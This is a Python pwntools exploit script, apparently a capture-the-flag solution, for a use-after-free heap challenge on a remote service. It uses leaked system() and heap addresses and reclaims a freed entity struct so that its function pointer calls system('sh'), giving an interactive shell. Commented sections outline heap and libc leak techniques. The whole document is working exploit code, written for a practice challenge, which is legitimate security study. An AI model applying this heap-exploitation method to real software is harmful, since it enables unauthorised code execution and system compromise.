# %%

from pwn import *

# %%


class UAFWorker():

    conn: remote

    def __init__(self, port):
        self.conn = remote('10.113.184.121', port)
        # self.conn = process('./src/release/share/chal')
        return

    def _menu(self):
        res = self.conn.recvuntil(b': ')
        return res

    def _res(self):
        _mes = b'1. register entity'
        res = self.conn.recvuntil(_mes, drop=True)
        return res

    def register_entity(self, idx):
        print("\nRegister Entity")

        self._menu()
        self.conn.sendline(b'1')

        self.conn.recvuntil(b'Index: ')
        self.conn.send(str(idx).encode() + b'\x00')
        return

    def delete_entity(self, idx):
        print("\nDelete Entity")

        self._menu()
        self.conn.sendline(b'2')

        self.conn.recvuntil(b'Index: ')
        self.conn.send(str(idx).encode() + b'\x00')
        return

    def set_name(self, idx, name_len, name: bytes):
        print("\nSet Name")

        self._menu()
        self.conn.sendline(b'3')

        self.conn.recvuntil(b'Index: ')
        self.conn.send(str(idx).encode() + b'\x00')

        # TYPO FROM THE AUTHOR
        self.conn.recvuntil(b'Nmae Length: ')
        self.conn.sendline(str(name_len).encode() + b'\x00')

        self.conn.recvuntil(b'Name: ')
        self.conn.sendline(name)
        # self.conn.sendline(str(name).encode())
        return

    def trigger_event(self, idx):
        print("\nTrigger Event")

        self._menu()
        self.conn.sendline(b'4')

        self.conn.recvuntil(b'Index: ')
        self.conn.send(str(idx).encode() + b'\x00')
        return

    def interactive(self):
        print("\ninteractive")

        self.conn.interactive()
        return


# %%

context.arch = 'amd64'

uaf_worker = UAFWorker(10057)

uaf_worker.conn.recvuntil(b'gift1: ')
system_addr = int(uaf_worker.conn.recvline().strip(), 16)
print(f"{hex(system_addr) = }")

uaf_worker.conn.recvuntil(b'gift2: ')
heap_leak = int(uaf_worker.conn.recvline().strip(), 16)
print(f"{hex(heap_leak) = }")

# %%

# 0x10 -> 0x20
# void *ptr = malloc(0x10);

# 0x18 -> 0x20
uaf_worker.register_entity(0)
# 0x18 -> 0x20
uaf_worker.register_entity(1)

uaf_worker.set_name(1, 0x10, b'sh\x00')

uaf_worker.delete_entity(0)

# struct entity
# {
# 	char *name;
# 	char *event;
# 	void (*event_handle)(char *);
# };

entity_size = 0x18
sh_addr = heap_leak + 0x60
payload = flat([
    0,
    sh_addr,
    system_addr,
])

uaf_worker.set_name(1, entity_size, payload)

uaf_worker.trigger_event(0)

uaf_worker.interactive()

# %%

# leak heap

# uaf_worker.register_entity(0)
# uaf_worker.register_entity(1)
# uaf_worker.register_entity(2)

# uaf_worker.delete_entity(0)
# uaf_worker.delete_entity(1)
# uaf_worker.set_name(2, 0x18, b'')

# print(f"{hex(system_addr) = }")
# print(f"{hex(heap_leak) = }")

# uaf_worker.interactive()
# # 4 2
# # will show heap base

# %%

# laek libc
# need to malloc and free into unsorted bin

# for i in range(0x9):
#     uaf_worker.register_entity(i)
#     uaf_worker.set_name(i, 0x88, b'a')

# for i in range(0x9):
#     uaf_worker.delete_entity(i)

# for i in range(0x8):
#     uaf_worker.register_entity(i)
#     uaf_worker.set_name(i, 0x88, b'a')

# print(f"{hex(system_addr) = }")
# print(f"{hex(heap_leak) = }")

# uaf_worker.interactive()
# # 4 7
# # will show libc base

# %%
